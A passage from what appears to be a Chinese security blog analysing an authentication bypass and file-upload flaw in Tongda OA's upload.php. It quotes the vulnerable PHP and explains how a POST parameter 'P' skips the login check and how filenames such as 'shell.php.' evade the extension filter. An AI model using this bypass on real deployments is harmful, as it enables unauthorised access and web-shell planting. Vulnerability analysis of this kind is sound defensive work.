class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">$P = $_POST[<span class="string">'P'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($P) || $P != <span class="string">''</span>) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">'inc/session.php'</span>;</span><br><span class="line">    session_id($P);</span><br><span class="line">    session_start();</span><br><span class="line">    session_write_close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">'./auth.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'inc/utility_file.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'inc/utility_msg.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'mobile/inc/funcs.php'</span>;</span><br><span class="line">ob_end_clean();</span><br><span class="line">$TYPE = $_POST[<span class="string">'TYPE'</span>];</span><br><span class="line">$DEST_UID = $_POST[<span class="string">'DEST_UID'</span>];</span><br><span class="line">$dataBack = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span> ($DEST_UID != <span class="string">''</span> &amp;&amp; !td_verify_ids($ids)) &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'½ÓÊÕ·½IDÎÞÐ§'</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($DEST_UID, <span class="string">','</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $DEST_UID = intval($DEST_UID);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($DEST_UID == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE != <span class="number">2</span>) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'½ÓÊÕ·½IDÎÞÐ§'</span>));</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$MODULE = <span class="string">'im'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span> &lt;= count($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'1'</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen(urldecode($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>])) != strlen($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">            $_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>] = urldecode($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $ATTACHMENTS = upload(<span class="string">'ATTACHMENT'</span>, $MODULE, <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!is_array($ATTACHMENTS)) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . $ATTACHMENTS);</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    $ATTACHMENT_ID = substr($ATTACHMENTS[<span class="string">'ID'</span>], <span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">    $ATTACHMENT_NAME = substr($ATTACHMENTS[<span class="string">'NAME'</span>], <span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ($TYPE == <span class="string">'mobile'</span>) &#123;</span><br><span class="line">        $ATTACHMENT_NAME = td_iconv(urldecode($ATTACHMENT_NAME), <span class="string">'utf-8'</span>, MYOA_CHARSET);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'ÎÞÎÄ¼þÉÏ´«'</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$FILE_SIZE = attach_size($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line"><span class="keyword">if</span> (!$FILE_SIZE) &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'ÎÄ¼þÉÏ´«Ê§°Ü'</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'1'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_thumbable($ATTACHMENT_NAME)) &#123;</span><br><span class="line">        $FILE_PATH = attach_real_path($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line">        $THUMB_FILE_PATH = substr($FILE_PATH, <span class="number">0</span>, strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) . <span class="string">'thumb_'</span> . $ATTACHMENT_NAME;</span><br><span class="line">        CreateThumb($FILE_PATH, <span class="number">320</span>, <span class="number">240</span>, $THUMB_FILE_PATH);</span><br><span class="line">    &#125;</span><br><span class="line">    $P_VER = is_numeric($P_VER) ? intval($P_VER) : <span class="number">0</span>;</span><br><span class="line">    $MSG_CATE = $_POST[<span class="string">'MSG_CATE'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($MSG_CATE == <span class="string">'file'</span>) &#123;</span><br><span class="line">        $CONTENT = <span class="string">'[fm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $FILE_SIZE . <span class="string">'[/fm]'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ($MSG_CATE == <span class="string">'image'</span>) &#123;</span><br><span class="line">            $CONTENT = <span class="string">'[im]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $FILE_SIZE . <span class="string">'[/im]'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $DURATION = intval($DURATION);</span><br><span class="line">            $CONTENT = <span class="string">'[vm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $DURATION . <span class="string">'[/vm]'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $AID = <span class="number">0</span>;</span><br><span class="line">    $POS = strpos($ATTACHMENT_ID, <span class="string">'@'</span>);</span><br><span class="line">    <span class="keyword">if</span> ($POS !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $AID = intval(substr($ATTACHMENT_ID, <span class="number">0</span>, $POS));</span><br><span class="line">    &#125;</span><br><span class="line">    $query = <span class="string">'INSERT INTO im_offline_file (TIME,SRC_UID,DEST_UID,FILE_NAME,FILE_SIZE,FLAG,AID) values (\''</span> . date(<span class="string">'Y-m-d H:i:s'</span>) . <span class="string">'\',\''</span> . $_SESSION[<span class="string">'LOGIN_UID'</span>] . <span class="string">'\',\''</span> . $DEST_UID . <span class="string">'\',\'*'</span> . $ATTACHMENT_ID . <span class="string">'.'</span> . $ATTACHMENT_NAME . <span class="string">'\',\''</span> . $FILE_SIZE . <span class="string">'\',\'0\',\''</span> . $AID . <span class="string">'\')'</span>;</span><br><span class="line">    $cursor = exequery(TD::conn(), $query);</span><br><span class="line">    $FILE_ID = mysql_insert_id();</span><br><span class="line">    <span class="keyword">if</span> ($cursor === <span class="keyword">false</span>) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'Êý¾Ý¿â²Ù×÷Ê§°Ü'</span>));</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">1</span>, <span class="string">'content'</span> =&gt; $CONTENT, <span class="string">'file_id'</span> =&gt; $FILE_ID);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'2'</span>) &#123;</span><br><span class="line">        $DURATION = intval($_POST[<span class="string">'DURATION'</span>]);</span><br><span class="line">        $CONTENT = <span class="string">'[vm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $DURATION . <span class="string">'[/vm]'</span>;</span><br><span class="line">        $query = <span class="string">'INSERT INTO WEIXUN_SHARE (UID, CONTENT, ADDTIME) VALUES (\''</span> . $_SESSION[<span class="string">'LOGIN_UID'</span>] . <span class="string">'\', \''</span> . $CONTENT . <span class="string">'\', \''</span> . time() . <span class="string">'\')'</span>;</span><br><span class="line">        $cursor = exequery(TD::conn(), $query);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'+OK '</span> . $CONTENT;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'3'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_thumbable($ATTACHMENT_NAME)) &#123;</span><br><span class="line">                $FILE_PATH = attach_real_path($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line">                $THUMB_FILE_PATH = substr($FILE_PATH, <span class="number">0</span>, strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) . <span class="string">'thumb_'</span> . $ATTACHMENT_NAME;</span><br><span class="line">                CreateThumb($FILE_PATH, <span class="number">320</span>, <span class="number">240</span>, $THUMB_FILE_PATH);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'+OK '</span> . $ATTACHMENT_ID;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $CONTENT = <span class="string">'[fm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $FILE_SIZE . <span class="string">'[/fm]'</span>;</span><br><span class="line">            $msg_id = send_msg($_SESSION[<span class="string">'LOGIN_UID'</span>], $DEST_UID, <span class="number">1</span>, $CONTENT, <span class="string">''</span>, <span class="number">2</span>);</span><br><span class="line">            $query = <span class="string">'insert into IM_OFFLINE_FILE (TIME,SRC_UID,DEST_UID,FILE_NAME,FILE_SIZE,FLAG) values (\''</span> . date(<span class="string">'Y-m-d H:i:s'</span>) . <span class="string">'\',\''</span> . $_SESSION[<span class="string">'LOGIN_UID'</span>] . <span class="string">'\',\''</span> . $DEST_UID . <span class="string">'\',\'*'</span> . $ATTACHMENT_ID . <span class="string">'.'</span> . $ATTACHMENT_NAME . <span class="string">'\',\''</span> . $FILE_SIZE . <span class="string">'\',\'0\')'</span>;</span><br><span class="line">            $cursor = exequery(TD::conn(), $query);</span><br><span class="line">            $FILE_ID = mysql_insert_id();</span><br><span class="line">            <span class="keyword">if</span> ($cursor === <span class="keyword">false</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'-ERR '</span> . _(<span class="string">'Êý¾Ý¿â²Ù×÷Ê§°Ü'</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($FILE_ID == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'-ERR '</span> . _(<span class="string">'Êý¾Ý¿â²Ù×÷Ê§°Ü2'</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'+OK ,'</span> . $FILE_ID . <span class="string">','</span> . $msg_id;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看下开头这一块，就是绕过的核心部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">set_time_limit(0);</span><br><span class="line">$P &#x3D; $_POST[&#39;P&#39;];</span><br><span class="line">if (isset($P) || $P !&#x3D; &#39;&#39;) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    include_once &#39;inc&#x2F;session.php&#39;;</span><br><span class="line">    session_id($P);</span><br><span class="line">    session_start();</span><br><span class="line">    session_write_close();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    include_once &#39;.&#x2F;auth.php&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>这里获取了一个P，如果P存在或者不为空，就要包含上面的auth.php，看名字就知道是一个主要实现身份认证功能，所以通过这里的参数”P”绕过登录认证，就可以去下面的上传了</li><li>在往后就是两个IF条件句，只要进去了都要exit退出，所以要绕过才能进入上传的逻辑里面</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$DEST_UID &#x3D; $_POST[&#39;DEST_UID&#39;];</span><br><span class="line">还好这个参数可控，要求不能为 0 也不能为空就可以了</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200403094623450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>进入循环后使用PHP的 $_FILES 函数来获取我们上传的文件信息</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_FILES[&#39;ATTACHMENT&#39;][&#39;name&#39;]</span><br></pre></td></tr></table></figure><ul><li>第一个下标必须是我们的input name值，因此我们的POST包的Content-Disposition: form-data; name=“ATTACHMENT”; filename=”xxx.php.png”中的name必须是’ATTACHMENT’。</li><li>也就是有文件上传就会调用upload函数</li><li>后续对获取的文件名处理了一下，对获取的文件名行一次url解码，对比文件名长度是否有变化，如果有变化，则将url解码后的文件名作为最后的文件名</li><li>在45行有upload函数，要跟进看一下干了什么，inc/utility_file.php的1321行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ATTACHMENTS &#x3D; upload(&#39;ATTACHMENT&#39;, $MODULE, false);</span><br></pre></td></tr></table></figure><p>函数具体代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($PREFIX = <span class="string">'ATTACHMENT'</span>, $MODULE = <span class="string">''</span>, $OUTPUT = true)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strstr($MODULE, <span class="string">'/'</span>) || strstr($MODULE, <span class="string">'\\'</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!$OUTPUT) &#123;</span><br><span class="line">            <span class="keyword">return</span> _(<span class="string">'参数含有非法字符。'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Message(_(<span class="string">'错误'</span>), _(<span class="string">'参数含有非法字符。'</span>));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $ATTACHMENTS = <span class="keyword">array</span>(<span class="string">'ID'</span> =&gt; <span class="string">''</span>, <span class="string">'NAME'</span> =&gt; <span class="string">''</span>);</span><br><span class="line">    reset($_FILES);</span><br><span class="line">    <span class="keyword">foreach</span> ($_FILES <span class="keyword">as</span> $KEY =&gt; $ATTACHMENT) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($ATTACHMENT[<span class="string">'error'</span>] == <span class="number">4</span> || $KEY != $PREFIX &amp;&amp; substr($KEY, <span class="number">0</span>, strlen($PREFIX) + <span class="number">1</span>) != $PREFIX . <span class="string">'_'</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $data_charset = <span class="keyword">isset</span>($_GET[<span class="string">'data_charset'</span>]) ? $_GET[<span class="string">'data_charset'</span>] : (<span class="keyword">isset</span>($_POST[<span class="string">'data_charset'</span>]) ? $_POST[<span class="string">'data_charset'</span>] : <span class="string">''</span>);</span><br><span class="line">        $ATTACH_NAME = $data_charset != <span class="string">''</span> ? td_iconv($ATTACHMENT[<span class="string">'name'</span>], $data_charset, MYOA_CHARSET) : $ATTACHMENT[<span class="string">'name'</span>];</span><br><span class="line">        $ATTACH_SIZE = $ATTACHMENT[<span class="string">'size'</span>];</span><br><span class="line">        $ATTACH_ERROR = $ATTACHMENT[<span class="string">'error'</span>];</span><br><span class="line">        $ATTACH_FILE = $ATTACHMENT[<span class="string">'tmp_name'</span>];</span><br><span class="line">        $ERROR_DESC = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_OK) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!is_uploadable($ATTACH_NAME)) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'禁止上传后缀名为[%s]的文件'</span>), substr($ATTACH_NAME, strrpos($ATTACH_NAME, <span class="string">'.'</span>) + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            $encode = mb_detect_encoding($ATTACH_NAME, <span class="keyword">array</span>(<span class="string">'ASCII'</span>, <span class="string">'UTF-8'</span>, <span class="string">'GB2312'</span>, <span class="string">'GBK'</span>, <span class="string">'BIG5'</span>));</span><br><span class="line">            <span class="keyword">if</span> ($encode != <span class="string">'UTF-8'</span>) &#123;</span><br><span class="line">                $ATTACH_NAME_UTF8 = mb_convert_encoding($ATTACH_NAME, <span class="string">'utf-8'</span>, MYOA_CHARSET);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $ATTACH_NAME_UTF8 = $ATTACH_NAME;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/[\\\':&lt;&gt;?]|\\/|\\\\|"|\\|/u'</span>, $ATTACH_NAME_UTF8)) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'文件名[%s]包含[/\\\'":*?&lt;&gt;|]等非法字符'</span>), $ATTACH_NAME);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($ATTACH_SIZE == <span class="number">0</span>) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]大小为0字节'</span>), $ATTACH_NAME);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($ERROR_DESC == <span class="string">''</span>) &#123;</span><br><span class="line">                $ATTACH_NAME = str_replace(<span class="string">'\''</span>, <span class="string">''</span>, $ATTACH_NAME);</span><br><span class="line">                $ATTACH_ID = add_attach($ATTACH_FILE, $ATTACH_NAME, $MODULE);</span><br><span class="line">                <span class="keyword">if</span> ($ATTACH_ID === <span class="keyword">false</span>) &#123;</span><br><span class="line">                    $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]上传失败'</span>), $ATTACH_NAME);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $ATTACHMENTS[<span class="string">'ID'</span>] .= $ATTACH_ID . <span class="string">','</span>;</span><br><span class="line">                    $ATTACHMENTS[<span class="string">'NAME'</span>] .= $ATTACH_NAME . <span class="string">'*'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            @unlink($ATTACH_FILE);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_INI_SIZE) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]的大小超过了系统限制（%s）'</span>), $ATTACH_NAME, ini_get(<span class="string">'upload_max_filesize'</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_FORM_SIZE) &#123;</span><br><span class="line">                    $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]的大小超过了表单限制'</span>), $ATTACH_NAME);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_PARTIAL) &#123;</span><br><span class="line">                        $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]上传不完整'</span>), $ATTACH_NAME);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_NO_TMP_DIR) &#123;</span><br><span class="line">                            $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]上传失败：找不到临时文件夹'</span>), $ATTACH_NAME);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_CANT_WRITE) &#123;</span><br><span class="line">                                $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]写入失败'</span>), $ATTACH_NAME);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                $ERROR_DESC = sprintf(_(<span class="string">'未知错误[代码：%s]'</span>), $ATTACH_ERROR);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($ERROR_DESC != <span class="string">''</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!$OUTPUT) &#123;</span><br><span class="line">                delete_attach($ATTACHMENTS[<span class="string">'ID'</span>], $ATTACHMENTS[<span class="string">'NAME'</span>], $MODULE);</span><br><span class="line">                <span class="keyword">return</span> $ERROR_DESC;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Message(_(<span class="string">'错误'</span>), $ERROR_DESC);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $ATTACHMENTS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>看下is_uploadable()函数对文件名进行检查，跟进到该函数，同样位于inc/utility_file.php</li></ul><p><img src="https://img-blog.csdnimg.cn/20200330095139194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>这个仔细看一下，代码意思是查找 “.” 在文件名中最后一次出现的位置然后</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strtolower(substr($FILE_NAME, $POS + 1, 3)) &#x3D;&#x3D; &#39;php&#39;</span><br></pre></td></tr></table></figure><ul><li>这是 substr( 文件名,最后一次点的位置+1,3个位置)</li><li>从存在 ”.“ 开始匹配3位，判断后缀是否为php，,如果为php则返回false,否则将”.”之前的作为EXT_NAME。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200330095216717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>这么判断 .php肯定是不行了，只能是 shell.php. 或者 shell.php.png</li><li>那么只能是配合文件包含漏洞了</li></ul><h2 id="变量传递问题"><a href="#变量传递问题" class="headerlink" title="变量传递问题"></a>变量传递问题</h2><ul><li><p>由于在upload.php中UPLOAD_MODE值的是一个重要的流程走向的判断</p></li><li><p>但是并没有发现是从哪来的，所以一直很疑惑，</p></li><li><p>但根据payload中POST的UPLOAD_MODE值可以被正常带入且影响文件上传走向</p></li><li><p>预测 UPLOAD_MODE值的方法存在于被包含的文件中,</p></li><li><p>但是UPLOAD_MODE这个参数名仅存在于upload.php中</p></li><li><p>开始追溯，发现下面的路径</p></li><li><p>具体调用为upload.php -&gt; session.php -&gt; coon.php -&gt; td_config.php -&gt; common.inc.php</p></li></ul><p>关键部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">if (0 &lt; count($_POST)) &#123;</span><br><span class="line">    $arr_html_fields &#x3D; array();</span><br><span class="line">    foreach 